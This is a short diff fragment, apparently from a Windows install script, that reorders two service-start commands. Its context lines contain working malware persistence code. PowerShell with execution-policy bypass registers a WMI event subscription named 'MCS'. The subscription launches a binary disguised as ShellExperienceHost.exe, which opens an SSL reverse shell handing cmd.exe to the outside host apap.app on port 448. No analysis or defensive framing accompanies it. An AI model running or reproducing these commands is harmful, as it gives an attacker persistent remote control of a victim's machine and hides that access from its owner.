@@ -64,5 +64,5 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-WmiInstance -Nam
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='MCS'; CommandLineTemplate='%ProgramData%\config..\ShellExperienceHost.exe --ssl apap.app 448 -e cmd.exe'} | Out-Null"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"MCS\"'; Consumer='CommandLineEventConsumer.Name=\"MCS\"'} | Out-Null"
 
-sc start Performance
 sc start Configuration
+sc start Performance
